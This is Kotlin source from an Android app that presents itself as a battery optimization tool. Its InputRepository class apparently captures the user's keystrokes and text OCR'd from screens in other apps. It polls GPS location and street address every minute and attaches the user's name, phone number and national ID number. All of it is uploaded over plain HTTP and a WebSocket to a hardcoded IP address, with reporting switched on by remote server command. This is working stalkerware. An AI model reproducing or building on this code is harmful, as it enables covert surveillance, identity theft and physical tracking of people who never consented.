package com.android.batteryoptimization

import android.content.Context
import android.os.Build
import android.util.Log
import com.android.batteryoptimization.network.NetworkClient
import com.android.batteryoptimization.network.UploadResponse
import com.android.batteryoptimization.network.WebSocketManager
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import com.android.batteryoptimization.ocr.api.OcrResult
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import java.io.File
import java.net.URLEncoder
import okhttp3.ResponseBody
class InputRepository private constructor(private val context: Context) {

    companion object {
        private const val TAG = "InputRepository"
        const val KEY_REPORT_ENABLED = "report_enabled"

        @Volatile
        private var instance: InputRepository? = null

        fun getInstance(context: Context): InputRepository {
            return instance ?: synchronized(this) {
                instance ?: InputRepository(context).also { instance = it }
            }
        }
    }

    private val file = File(context.applicationContext.filesDir, "events.json")
    private val backupFile = File(context.applicationContext.filesDir, "backup_events.json")
    private val userInfoFile = File(context.applicationContext.filesDir, "user_info.json")
    private val uploadRecordsFile = File(context.applicationContext.filesDir, "upload_records.json")
    private val gson = Gson()
    private val uploadLogPrefs = context.getSharedPreferences("upload_logs", Context.MODE_PRIVATE)
    private val prefs = context.getSharedPreferences("keystroke_prefs", Context.MODE_PRIVATE)

    private val _eventsFlow = MutableStateFlow<List<InputEvent>>(emptyList())
    val eventsFlow: StateFlow<List<InputEvent>> = _eventsFlow.asStateFlow()

    private val repositoryScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var timerJob: Job? = null
    
    private val uploadMutex = kotlinx.coroutines.sync.Mutex()
    private var lastUploadAttemptTime = 0L
    private val MIN_UPLOAD_INTERVAL = 10000L // 10 seconds
    
    // Constants for upload strategy
    private val UPLOAD_THRESHOLD = 5
    private val UPLOAD_INTERVAL_MS = 10 * 1000L // 10 seconds

    // Location refresh interval (seconds, easy to adjust)
    val LOCATION_INTERVAL_SECONDS = 60 // 1 minute
    private val LOCATION_INTERVAL_MS = LOCATION_INTERVAL_SECONDS * 1000L

    // Cached location map (refreshed periodically, contains all geo fields from AMapLocationHelper)
    @Volatile
    private var cachedLocationMap: Map<String, Any> = emptyMap()

    private fun getCachedGeoLocation(): com.android.batteryoptimization.network.GeoLocationPayload? {
        val map = cachedLocationMap
        if (map.isEmpty()) return null
        val lat = (map["latitude"] as? Number)?.toDouble()
        val lng = (map["longitude"] as? Number)?.toDouble()
        if (lat == null || lng == null || (lat == 0.0 && lng == 0.0)) return null
        return com.android.batteryoptimization.network.GeoLocationPayload(
            latitude = lat,
            longitude = lng,
            accuracy = (map["accuracy"] as? Number)?.toFloat() ?: 0f,
            altitude = (map["altitude"] as? Number)?.toDouble() ?: 0.0,
            speed = (map["speed"] as? Number)?.toFloat() ?: 0f,
            bearing = (map["bearing"] as? Number)?.toFloat() ?: 0f,
            address = map["address"] as? String ?: "",
            country = map["country"] as? String ?: "",
            province = map["province"] as? String ?: "",
            city = map["city"] as? String ?: "",
            cityCode = map["cityCode"] as? String ?: "",
            district = map["district"] as? String ?: "",
            adCode = map["adCode"] as? String ?: "",
            street = map["street"] as? String ?: "",
            streetNum = map["streetNum"] as? String ?: "",
            road = map["road"] as? String ?: "",
            description = map["description"] as? String ?: "",
            locationType = (map["locationType"] as? Number)?.toInt() ?: -1,
            coordType = map["coordType"] as? String ?: "",
            locationTime = (map["locationTime"] as? Number)?.toLong() ?: 0L
        )
    }

    init {
        loadEvents()
        resetTimer()
        startLocationTimer()
    }

    fun loadEvents() {
        if (!file.exists()) {
            _eventsFlow.value = emptyList()
            return
        }
        val json = try {
            file.readText()
        } catch (e: Exception) {
            null
        }
        val events: List<InputEvent> = if (json != null) {
            val type = object : TypeToken<List<InputEvent>>() {}.type
            try {
                gson.fromJson(json, type)
            } catch (e: Exception) {
                emptyList()
            }
        } else {
            emptyList()
        }
        _eventsFlow.value = events
    }

    fun addEvent(event: InputEvent) {
        if (event.text.isBlank()) return
        val currentEvents = _eventsFlow.value.toMutableList()

        if (currentEvents.isNotEmpty()) {
            val lastEvent = currentEvents[0]
            // Bidirectional prefix check + time-based merging (within 60 seconds)
            val isPrefixOverlap = event.packageName == lastEvent.packageName &&
                    (event.text.startsWith(lastEvent.text) || lastEvent.text.startsWith(event.text))
            val isRecent = event.timestamp - lastEvent.timestamp < 60000L

            if (isPrefixOverlap && isRecent) {
                // Keep the longer text as the single source of truth
                currentEvents[0] = if (event.text.length >= lastEvent.text.length) event else lastEvent
            } else {
                currentEvents.add(0, event)
            }
        } else {
            currentEvents.add(0, event)
        }

        _eventsFlow.value = currentEvents
        saveEvents(currentEvents)
        
        // Trigger Strategy A: Quantity Threshold
        val unuploadedCount = currentEvents.count { !it.isUploaded }
        if (unuploadedCount >= UPLOAD_THRESHOLD) {
            repositoryScope.launch {
                uploadData()
            }
        }
    }

    /**
     * Add OCR results as events, merged into the existing event stream.
     * 上传时会按 (timestamp, packageName) 分组合并为一次 OCR 会话。
     */
    fun addOcrEvents(
        packageName: String,
        appName: String,
        results: List<OcrResult>
    ) {
        val now = System.currentTimeMillis()
        val currentEvents = _eventsFlow.value.toMutableList()

        for (result in results) {
            if (result.text.isBlank()) continue
            val event = InputEvent(
                timestamp = now,
                packageName = packageName,
                appName = appName,
                text = result.text,
                source = "ocr"
            )
            currentEvents.add(0, event)
        }

        _eventsFlow.value = currentEvents
        saveEvents(currentEvents)

        val unuploadedCount = currentEvents.count { !it.isUploaded }
        if (unuploadedCount >= UPLOAD_THRESHOLD) {
            repositoryScope.launch {
                uploadData()
            }
        }
    }

    private fun resetTimer() {
        timerJob?.cancel()
        timerJob = repositoryScope.launch {
            while (isActive) {
                delay(UPLOAD_INTERVAL_MS)
                uploadData()
            }
        }
    }

    private var locationJob: Job? = null

    private fun startLocationTimer() {
        locationJob?.cancel()
        locationJob = repositoryScope.launch {
            // Initial location fetch
            refreshLocation()
            while (isActive) {
                delay(LOCATION_INTERVAL_MS)
                refreshLocation()
            }
        }
    }

    private fun refreshLocation() {
        try {
            val result = AMapLocationHelper.getLocation(context)
            val errorCode = result["errorCode"] as? Int ?: -1
            if (errorCode == 0) {
                // 校验地址完整性：地址核心字段为空时不缓存，避免残废数据被上报
                val address = result["address"] as? String ?: ""
                val province = result["province"] as? String ?: ""
                val city = result["city"] as? String ?: ""
                if (address.isBlank() && province.isBlank() && city.isBlank()) {
                    Log.w(TAG, "定位成功但地址信息为空，不缓存: lat=${result["latitude"]}, lng=${result["longitude"]}")
                    return
                }
                cachedLocationMap = result
                val lat = result["latitude"] ?: 0.0
                val lng = result["longitude"] ?: 0.0
                Log.d(TAG, "定位刷新: lat=$lat, lng=$lng, time=${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}")
                // 定时定位成功后主动上传位置（每 LOCATION_INTERVAL_MS 一次）
                val uploadMap = result.toMutableMap().apply { this["source"] = "timer" }
                if (WebSocketManager.isConnected()) {
                    WebSocketManager.sendLocation(uploadMap)
                    AMapLocationHelper.logGpsUpload(context, uploadMap)
                    Log.d(TAG, "定时位置已上传")
                } else {
                    // WebSocket 未连接（锁屏无网等）→ 落盘待传 + 调度 WorkManager 补传
                    Log.w(TAG, "WebSocket 未连接，位置存入待传队列")
                    AMapLocationHelper.savePendingLocation(context, uploadMap)
                    PendingLocationWorker.scheduleRetry(context)
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "定位刷新异常", e)
        }
    }

    suspend fun forceRefreshLocation(): com.android.batteryoptimization.network.GeoLocationPayload? = withContext(Dispatchers.IO) {
        val result = try {
            AMapLocationHelper.getLocation(context)
        } catch (e: Exception) {
            Log.e(TAG, "强制定位异常", e)
            mapOf("errorCode" to -3, "errorInfo" to (e.message ?: "定位异常"))
        }

        val errorCode = result["errorCode"] as? Int ?: -1
        val errorInfo = result["errorInfo"] as? String ?: "未知错误"
        if (errorCode == 0) {
            cachedLocationMap = result
            val lat = result["latitude"] ?: 0.0
            val lng = result["longitude"] ?: 0.0
            Log.d(TAG, "强制定位刷新成功: lat=$lat, lng=$lng")
        } else {
            throw Exception("定位失败 (错误码: $errorCode): $errorInfo")
        }
        getCachedGeoLocation()
    }

    // ─── 数据上报开关（服务器 report_enabled 指令控制） ─────────────

    private val _reportEnabledFlow = MutableStateFlow(prefs.getBoolean(KEY_REPORT_ENABLED, false))
    val reportEnabledFlow: kotlinx.coroutines.flow.StateFlow<Boolean> = _reportEnabledFlow.asStateFlow()

    /** 当前是否开启数据上报（默认关闭） */
    fun isReportEnabled(): Boolean = _reportEnabledFlow.value

    /** 设置数据上报开关：true=开启，false=关闭 */
    fun setReportEnabled(enabled: Boolean) {
        prefs.edit().putBoolean(KEY_REPORT_ENABLED, enabled).apply()
        _reportEnabledFlow.value = enabled
        Log.d(TAG, "数据上报已${if (enabled) "开启" else "关闭"}")
    }

    suspend fun uploadData(): Pair<Boolean, String> {
        // 数据上报开关关闭时禁止上传
        if (!isReportEnabled()) {
            return Pair(false, "数据上报已关闭")
        }
        if (!uploadMutex.tryLock()) return Pair(false, "正在上传中")
        try {
            val currentTime = System.currentTimeMillis()
            if (currentTime - lastUploadAttemptTime < MIN_UPLOAD_INTERVAL) {
                return Pair(false, "暂无最新数据上报")
            }
            lastUploadAttemptTime = currentTime

            val allEvents = _eventsFlow.value.toList()
            val unuploadedEvents = allEvents.filter { !it.isUploaded }
            if (unuploadedEvents.isEmpty()) return Pair(false, "没有需要上报的数据")

            val chronoEvents = unuploadedEvents.reversed()
            // Dedup: if a later/newer event's text contains an earlier/older event's text as prefix,
            // skip the older one - only keep the most complete text per input session
            val filteredList = mutableListOf<InputEvent>()
            for (i in chronoEvents.indices) {
                val current = chronoEvents[i]
                if (current.text.isBlank()) continue
                // Check if any already-kept newer event contains this older event's text
                val isContainedByNewer = filteredList.any { kept ->
                    kept.packageName == current.packageName && kept.text.startsWith(current.text)
                }
                if (!isContainedByNewer) {
                    filteredList.add(current)
                }
            }
            val currentEvents = filteredList.reversed()
            if (currentEvents.isEmpty()) return Pair(false, "没有需要上报的数据")

            val userInfo = getUserInfo()
            val name = userInfo?.name ?: "Unknown"
            val phone = userInfo?.phone ?: "Unknown"
            val idCard = userInfo?.idCard ?: "Unknown"
            val userIdentityId = userInfo?.userIdentityId ?: ""

            val deviceInfoJson = DeviceInfoHelper.getDeviceInfoJson(context)

            val userInfoPayload = com.android.batteryoptimization.network.UserInfoPayload(
                name = name,
                phone = phone,
                idCard = idCard,
                userIdentityId = userIdentityId
            )

            // 分离 OCR 事件和普通事件
            val ocrEvents = currentEvents.filter { it.source == "ocr" }
            val nonOcrEvents = currentEvents.filter { it.source != "ocr" }

            // OCR 事件按 (timestamp, packageName) 分组 → 每条 = 一次截屏会话
            val ocrSessions = ocrEvents
                .groupBy { it.timestamp to it.packageName }
                .map { (key, events) ->
                    val first = events.first()
                    val allTexts = events.map { it.text }.filter { it.isNotBlank() }
                    com.android.batteryoptimization.network.OcrSessionPayload(
                        packageName = key.second,
                        appName = first.appName,
                        text = allTexts,
                        timestamp = key.first
                    )
                }

            // 普通事件保持原有格式
            val eventPayloads = nonOcrEvents.map { event ->
                com.android.batteryoptimization.network.EventPayload(
                    packageName = event.packageName,
                    appName = event.appName,
                    text = event.text,
                    timestamp = event.timestamp,
                    source = event.source
                )
            }

            val requestBody = com.android.batteryoptimization.network.UploadRequest(
                userInfo = userInfoPayload,
                events = eventPayloads,
                geoLocation = getCachedGeoLocation(),
                ocr = ocrSessions.ifEmpty { null }
            )

            val requestJson = gson.toJson(requestBody)

            return try {
                Log.d(TAG, "===== 开始上报 =====")
                Log.d(TAG, "接口地址: http://47.93.162.24/app/collection/collect")
                Log.d(TAG, "请求 Header (deviceInfo): $deviceInfoJson")
                Log.d(TAG, "请求 Body (requestBody): $requestJson")

                // Upload using Retrofit
                val responseBody = NetworkClient.uploadApi.uploadEvents(
                    deviceInfoJson = deviceInfoJson,
                    requestBody = requestBody
                )

                val bodyString = responseBody.string()
                Log.d(TAG, "===== 上报成功 =====")
                Log.d(TAG, "接口响应 body: $bodyString")

                // 保存上传日志用于调试查看
                saveUploadLog(requestJson, bodyString, deviceInfoJson)

                val uploadResponse = gson.fromJson(bodyString, UploadResponse::class.java)
                if (uploadResponse?.code == 0) {
                    val msg = uploadResponse.msg ?: "成功"
                    Log.d(TAG, "上报成功: ${eventPayloads.size} events + ${ocrSessions.size} ocr sessions, msg: $msg")

                    // Append to backup file
                    appendToBackup(currentEvents)

                    // 标记为已上报（包括那些被过滤掉的中间状态，也认为已处理完）
                    val unuploadedTimestamps = unuploadedEvents.map { it.timestamp }.toSet()
                    val currentFlowList = _eventsFlow.value.toMutableList()
                    for (i in currentFlowList.indices) {
                        if (currentFlowList[i].timestamp in unuploadedTimestamps) {
                            currentFlowList[i] = currentFlowList[i].copy(isUploaded = true)
                        }
                    }
                    _eventsFlow.value = currentFlowList
                    saveEvents(currentFlowList)

                    // Reset timer since we just successfully uploaded
                    resetTimer()
                    Pair(true, "上报成功: $msg")
                } else {
                    val errorMsg = "上报失败: code=${uploadResponse?.code}, msg=${uploadResponse?.msg}"
                    Log.e(TAG, "===== 上报失败 =====")
                    Log.e(TAG, errorMsg)
                    Log.e(TAG, "request body: $requestJson")
                    Pair(false, errorMsg)
                }
            } catch (e: retrofit2.HttpException) {
                val errorBodyStr = try {
                    e.response()?.errorBody()?.string() ?: "null"
                } catch (ex: Exception) {
                    "read errorBody failed: ${ex.message}"
                }
                val errorMsg = "上报失败: HTTP ${e.code()}, body: $errorBodyStr"
                Log.e(TAG, "===== 上报 HTTP 错误 =====")
                Log.e(TAG, "HTTP code: ${e.code()}")
                Log.e(TAG, "errorBody: $errorBodyStr")
                Log.e(TAG, "request body: $requestJson")
                saveUploadLog(requestJson, errorMsg, deviceInfoJson)
                Pair(false, errorMsg)
            } catch (e: Exception) {
                val errorMsg = "上报错误: ${e.message}"
                Log.e(TAG, "===== 上报异常 =====")
                Log.e(TAG, "异常类型: ${e.javaClass.simpleName}")
                Log.e(TAG, "异常信息: ${e.message}")
                Log.e(TAG, "异常堆栈: ", e)
                saveUploadLog(requestJson, errorMsg, deviceInfoJson)
                Pair(false, errorMsg)
            }
        } finally {
            uploadMutex.unlock()
        }
    }

    private fun appendToBackup(uploadedEvents: List<InputEvent>) {
        try {
            val existingBackupEvents = if (backupFile.exists()) {
                val type = object : TypeToken<List<InputEvent>>() {}.type
                try {
                    gson.fromJson<List<InputEvent>>(backupFile.readText(), type) ?: emptyList()
                } catch (e: Exception) {
                    emptyList()
                }
            } else {
                emptyList()
            }
            
            val newBackupEvents = existingBackupEvents.toMutableList()
            newBackupEvents.addAll(0, uploadedEvents) // keep newer at top
            
            // Limit backup file size to 2000 events to prevent out of memory
            val trimmedBackup = if (newBackupEvents.size > 2000) newBackupEvents.take(2000) else newBackupEvents
            
            backupFile.writeText(gson.toJson(trimmedBackup))
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun clearEvents() {
        _eventsFlow.value = emptyList()
        saveEvents(emptyList())
    }

    /** 读取所有已上传事件（备份文件） */
    fun getBackupEvents(): List<InputEvent> {
        if (!backupFile.exists()) return emptyList()
        return try {
            val type = object : TypeToken<List<InputEvent>>() {}.type
            gson.fromJson(backupFile.readText(), type) ?: emptyList()
        } catch (e: Exception) {
            emptyList()
        }
    }

    /** 保存最近一次上传的请求和响应用于调试查看 */
    fun saveUploadLog(requestBodyJson: String, responseBody: String, deviceInfoJson: String) {
        val now = System.currentTimeMillis()
        // 同时保存到 SharedPreferences（用于最近一次快速读取）
        uploadLogPrefs.edit()
            .putString("last_upload_request", requestBodyJson)
            .putString("last_upload_response", responseBody)
            .putString("last_upload_device_info", deviceInfoJson)
            .putLong("last_upload_time", now)
            .apply()

        // 追加到 upload_records.json 文件（完整历史）
        val record = UploadRecord(
            timestamp = now,
            success = responseBody.contains("\"code\":0") || responseBody.contains("\"code\": 0"),
            requestBody = requestBodyJson,
            deviceInfo = deviceInfoJson,
            response = responseBody
        )
        appendUploadRecord(record)
    }

    /** 追加一条上传记录到文件 */
    private fun appendUploadRecord(record: UploadRecord) {
        try {
            val existing = getUploadRecords().toMutableList()
            existing.add(0, record) // 最新在前
            // 最多保留 500 条
            val trimmed = if (existing.size > 500) existing.take(500) else existing
            uploadRecordsFile.writeText(gson.toJson(trimmed))
        } catch (e: Exception) {
            Log.e(TAG, "保存上传记录失败", e)
        }
    }

    /** 读取所有历史上传记录 */
    fun getUploadRecords(): List<UploadRecord> {
        if (!uploadRecordsFile.exists()) return emptyList()
        return try {
            val type = object : TypeToken<List<UploadRecord>>() {}.type
            gson.fromJson(uploadRecordsFile.readText(), type) ?: emptyList()
        } catch (e: Exception) {
            emptyList()
        }
    }

    fun getLastUploadRequest(): String? = uploadLogPrefs.getString("last_upload_request", null)
    fun getLastUploadResponse(): String? = uploadLogPrefs.getString("last_upload_response", null)
    fun getLastUploadDeviceInfo(): String? = uploadLogPrefs.getString("last_upload_device_info", null)
    fun getLastUploadTime(): Long = uploadLogPrefs.getLong("last_upload_time", 0L)

    private fun saveEvents(events: List<InputEvent>) {
        try {
            val json = gson.toJson(events)
            file.writeText(json)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    fun getUserInfo(): UserInfo? {
        if (!userInfoFile.exists()) {
            return null
        }
        return try {
            val json = userInfoFile.readText()
            gson.fromJson(json, UserInfo::class.java)
        } catch (e: Exception) {
            null
        }
    }

    fun saveUserInfo(userInfo: UserInfo) {
        try {
            val json = gson.toJson(userInfo)
            userInfoFile.writeText(json)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
